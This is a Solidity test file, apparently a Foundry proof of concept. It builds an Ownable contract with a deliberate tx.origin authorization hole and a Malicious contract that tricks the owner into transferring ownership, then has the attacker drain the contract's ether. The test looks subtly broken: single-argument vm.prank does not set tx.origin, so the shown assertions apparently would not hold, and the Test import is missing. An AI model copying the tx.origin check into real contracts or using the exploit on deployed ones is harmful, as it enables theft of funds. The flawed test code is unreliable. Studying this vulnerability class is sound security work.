// Minimal vulnerable replica
contract Ownable {
    address private _owner;
    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    constructor() {
        _owner = msg.sender;
        emit OwnershipTransferred(address(0), _owner);
    }

    function owner() public view returns (address) {
        return _owner;
    }

    // Vulnerable: uses tx.origin instead of msg.sender
    modifier onlyOwner() {
        require(_owner == tx.origin, "Ownable: caller is not the owner");
        _;
    }

    function transferOwnership(address newOwner) public onlyOwner {
        require(newOwner != address(0), "Ownable: new owner is the zero address");
        emit OwnershipTransferred(_owner, newOwner);
        _owner = newOwner;
    }

    function withdraw(uint256 amount) public onlyOwner {
        payable(owner()).transfer(amount);
    }

    receive() external payable {}
}

// Malicious contract that will be called by the real owner (tx.origin == owner)
contract Malicious {
    Ownable public target;
    address payable public attacker;

    constructor(Ownable _target, address payable _attacker) {
        target = _target;
        attacker = _attacker;
    }

    // Owner is tricked into calling this. Inside this call tx.origin == owner,
    // so target.transferOwnership will pass the onlyOwner check and set owner to attacker.
    function trick() external {
        target.transferOwnership(attacker);
    }
}

contract OwnableTest is Test {
    Ownable target;
    Malicious mal;
    address ownerAddr;
    address payable attacker;

    function setUp() public {
        ownerAddr = makeAddr("owner");
        attacker = payable(makeAddr("attacker"));

        // Deploy target as the legitimate owner
        vm.prank(ownerAddr);
        target = new Ownable();

        // Fund the target contract so withdraw has something to send
        vm.deal(address(target), 1 ether);

        // Deploy malicious contract (attacker)
        vm.prank(attacker);
        mal = new Malicious(target, attacker);
    }

    function test_attacker_exploits_withdraw() public {
        // Owner is tricked into calling the malicious contract.
        // Because onlyOwner uses tx.origin, the call to transferOwnership succeeds and sets attacker as owner.
        vm.prank(ownerAddr);
        mal.trick();

        assertEq(target.owner(), attacker);

        // Now attacker (as new owner) can withdraw the funds to themselves
        uint256 before = attacker.balance;
        vm.prank(attacker);
        target.withdraw(1 ether);
        assertEq(attacker.balance, before + 1 ether);
    }
}

